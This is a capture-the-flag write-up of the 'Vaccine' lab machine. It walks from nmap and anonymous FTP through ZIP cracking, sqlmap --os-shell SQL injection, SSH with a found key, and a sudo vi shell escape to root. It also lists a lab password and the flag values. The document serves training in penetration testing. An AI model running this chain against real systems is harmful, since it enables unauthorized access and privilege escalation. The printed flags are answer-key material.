# Vaccine — CTF Write-up

## Target Information

| Information | Details |
|---|---|
| **Target IP** | `10.129.243.96` |
| **Operating System** | Linux |
| **Kernel** | `5.3.0-64-generic` |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN Vaccine.txt 10.129.243.96
```

### Scan Results

```text
Nmap 7.99 scan initiated Mon Sep 21 14:57:37 2026
Nmap scan report for 10.129.243.96

Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
|   FTP server status:
|      Logged in as ftpuser
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0 0 2533 Apr 13 2021 backup.zip

22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MegaCorp Login

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
```

### Findings

Three TCP ports were open:

- **21/tcp — FTP:** `vsftpd 3.0.3`
- **22/tcp — SSH:** OpenSSH
- **80/tcp — HTTP:** Apache `2.4.41`

Anonymous FTP access was enabled, and the server exposed `backup.zip`. The website hosted a login page titled **MegaCorp Login**.

### FTP and Backup File

I connected to FTP using anonymous access and downloaded `backup.zip`.

The ZIP archive was password-protected, so I used John the Ripper to recover its password. After extracting the archive, I found credentials in a PHP file.

---

## Exploitation

### SQL Injection

I used Burp Suite to intercept the web application's login request and saved it as `request.txt`.

I then used sqlmap to test the captured request and obtain an operating-system shell:

```bash
sqlmap -r request.txt --os-shell
```

This provided an unstable shell on the target.

### SSH Access

During further enumeration with LinPEAS, I found an SSH private key (`id_rsa`) on the target.

I used the key to connect over SSH as `postgres`:

```bash
ssh -i id_rsa postgres@10.129.243.96
```

This provided a more stable shell.

---

## Privilege Escalation

### Sudo Permissions

Using the recovered password `P@s5w0rd!`, I checked the user's sudo permissions:

```bash
sudo -l
```

The user was allowed to run:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### Escalation Through `vi`

Because `vi` was permitted to run with elevated privileges, I used its shell escape:

```vim
:set shell=/bin/bash
:shell
```

This resulted in a root shell.

---

## Flags

### User Flag

```text
ec9b13ca4d6229cd5cc1e09980965bf7
```

### Root Flag

```text
dd6e058e814260bc70e9bbdef2715849
```

---

## Lessons Learned

1. **Using `sqlmap -r` with a request captured in Burp Suite** is a convenient way to test a request while preserving its parameters and headers.
2. **After recovering a password, test it against relevant sudo permissions** when authorized to do so.
3. **An exposed SSH private key can provide a more stable access method**, depending on its permissions and the account it belongs to.
4. **A program such as `vi` run through `sudo` may allow a shell escape.** Check the program's GTFOBins entry and the exact sudo policy.
5. **Try to solve the lab independently before consulting hints.** Spending time on enumeration and documenting hypotheses helps build repeatable methodology.

---

## Attack Chain Summary

```text
FTP Anonymous Login
        ↓
   backup.zip
        ↓
  Crack ZIP Password
        ↓
Credentials in PHP File
        ↓
Web Login / Request
        ↓
Burp Suite + sqlmap
        ↓
   Unstable Shell
        ↓
     LinPEAS
        ↓
 SSH Private Key Found
        ↓
   SSH as postgres
        ↓
    sudo -l
        ↓
   sudo vi allowed
        ↓
    vi shell escape
        ↓
      Root Shell
```
